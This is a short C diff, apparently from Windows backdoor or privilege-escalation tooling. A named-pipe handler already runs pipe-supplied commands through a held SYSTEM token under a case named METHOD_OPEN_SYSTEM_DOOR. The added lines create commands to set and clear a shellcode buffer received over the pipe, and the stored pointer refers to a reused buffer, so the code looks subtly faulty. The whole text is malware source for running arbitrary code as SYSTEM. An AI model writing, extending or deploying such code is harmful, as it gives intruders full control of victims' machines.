@@ -11,6 +11,8 @@
 DWORD dwThreadId = 0;
 LPWSTR g_pwszCommandLine = NULL;
 HANDLE hSystemToken = INVALID_HANDLE_VALUE;
+PCHAR g_ShellcodeBuffer = NULL;
+DWORD g_dwShellcodeSize = 0;
 
 void* __RPC_USER midl_user_allocate(size_t size)
 {
@@ -78,6 +80,17 @@ DWORD HandleCode(VOID) {
             case METHOD_OPEN_SYSTEM_DOOR:
                 ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
                 SystemCreateProcess(char2wchar(szBuffer));
+                break;
+            case METHOD_SET_SYSTEM_SHELLCODE:
+                ReadFile(hPipe, szBuffer, BUFF_SIZE, &dwLen, NULL);
+                g_dwShellcodeSize = dwLen;
+                g_ShellcodeBuffer = szBuffer;
+                break;
+            case METHOD_UNSET_SYSTEM_SHELLCODE:
+                g_dwShellcodeSize = 0;
+                g_ShellcodeBuffer = NULL;
+                break;
+                
             default:
 
                 break;
